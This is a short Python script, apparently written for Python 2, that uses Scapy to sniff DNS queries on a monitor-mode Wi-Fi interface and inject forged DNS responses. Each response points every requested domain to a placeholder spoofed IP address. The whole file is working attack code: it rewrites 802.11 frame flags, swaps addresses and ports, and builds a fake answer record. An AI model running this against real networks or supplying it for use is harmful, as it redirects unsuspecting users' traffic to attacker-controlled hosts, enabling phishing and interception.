from scapy.all import *
import time
import logging

logger = logging.getLogger('main')
logging.basicConfig(format='%(levelname)s: %(message)s', level=logging.DEBUG)
logger.setLevel(logging.DEBUG)
# Set the interface for scapy to use
conf.iface = 'mon0'
# Set the spoofed response
spoofed_ip = 'x.x.x.x'

def send_response(x):
	req_domain = x[DNS].qd.qname
	logger.info('Found request for ' + req_domain)
	# First, we delete the existing lengths and checksums..
	# We will let Scapy re-create them
	del(x[UDP].len)
	del(x[UDP].chksum)
	del(x[IP].len)
	del(x[IP].chksum)
	# Let's build our response from a copy of the original packet
	response = x.copy()
	# Let's work our way up the layers!
	# We need to start by changing our response to be "from-ds", or from the access point.
	response.FCfield = 2L
	# Switch the MAC addresses
	response.addr1, response.addr2 = x.addr2, x.addr1
	# Switch the IP addresses
	response.src, response.dst = x.dst, x.src
	# Switch the ports
	response.sport, response.dport = x.dport, x.sport
	# Set the DNS flags
	response[DNS].qr = 1L
	response[DNS].ra = 1L
	response[DNS].ancount = 1
	# Let's add on the answer section
	response[DNS].an = DNSRR(
		rrname = req_domain,
		type = 'A',
		rclass = 'IN',
		ttl = 900,
		rdata = spoofed_ip
		)
	# Now, we inject the response!
	sendp(response)
	logger.info('Sent response: ' + req_domain + ' -> ' + spoofed_ip + '\n')

def main():
	logger.info('Starting to intercept [CTRL+C to stop]')
	sniff(prn=lambda x: send_response(x), lfilter=lambda x:x.haslayer(UDP) and x.dport == 53)

if __name__ == "__main__":
	# Make it happen!
	main()